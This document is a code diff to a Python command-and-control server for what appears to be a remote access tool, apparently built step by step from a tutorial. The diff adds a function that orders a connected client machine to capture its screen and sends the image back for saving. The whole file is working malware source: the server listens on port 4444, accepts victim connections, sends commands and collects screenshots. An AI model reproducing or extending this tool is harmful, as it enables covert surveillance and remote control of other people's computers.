@@ -13,8 +13,9 @@ End Developing Date:
 from queue import Queue
 # import socket
 from socket import socket, SOL_SOCKET, SO_REUSEADDR, error as SocketError
-from time import sleep
+from time import sleep, strftime
 from threading import Thread
+from os import path
 
 from miscs import *
 from miscs.colors import fColors, bColors
@@ -37,12 +38,12 @@ arrConnections = []  # Store All Connection Information about Socket Connections
 SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
 SERVER_PORT = 4444  # Server Port
 
-intBuffer = 1024  # Maximum Size(Bytes) of Data to Receive as
+intBuff = 1024  # Maximum Size(Bytes) of Data to Receive as
 
 # objSocket = None      # Socket Object
 
 # Step 3: Define Global lambda's
-decode_utf = lambda data: data.decode("utf-8")
+decode_utf8 = lambda data: data.decode("utf-8")
 
 remove_quotes = lambda string: string.replace('\"', '')
 
@@ -109,7 +110,7 @@ def socket_accept():
             arrConnections.append(conn)
 
             # Get Client info and add it to address
-            clientInfo = decode_utf(conn.recv(intBuffer)).split("',")
+            clientInfo = decode_utf8(conn.recv(intBuff)).split("',")
             address += clientInfo[0], clientInfo[1], clientInfo[2]
 
             # Append address to arrAddresses
@@ -285,10 +286,48 @@ def send_commands():
         elif strChoice == '--x' or strChoice == 'exit':
             close()
             exit(0)
-
+# Step 28: Define & Complete `screenshot()` Function on the Server
 def screenshot():
     send(b'screen')
     # send(str.encode('screen'))
+
+    # Get Screenshot Info and Print it
+    strClientResponse = decode_utf8(recv(intBuff))
+    print(f"\n{strClientResponse}")
+
+    # Used for receive all bytes of screenshot completely
+    intBuffer = ''
+
+    for counter in range(0, len(strClientResponse)):
+
+        # Get out the size of screenshot from strClientResponse and add it to intBuffer
+        if strClientResponse[counter].isdigit():
+            intBuffer += strClientResponse[counter]
+
+    intBuffer = int(intBuffer)
+
+    # Create filename from Date for screenshot
+    strFile = strftime("%Y%m%d%H%M%S" + ".png")
+
+    # Receive Screenshot bytes from the Client
+    screenData = recvall(intBuffer)
+
+    # Try to save screenshot to file
+    try:
+        # Open new file(strFile) and write screenshot to it
+        with open(strFile, 'wb') as pic:
+            pic.write(screenData)
+
+        # Notify User that Screenshot Saved succesfully
+        print(f"[+] Screenshot Saved.\n[+] Total bytes received: {str(path.getsize(strFile))} bytes.")
+
+    except Exception as e:
+        print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
+
+
+
+
+
 
 
 
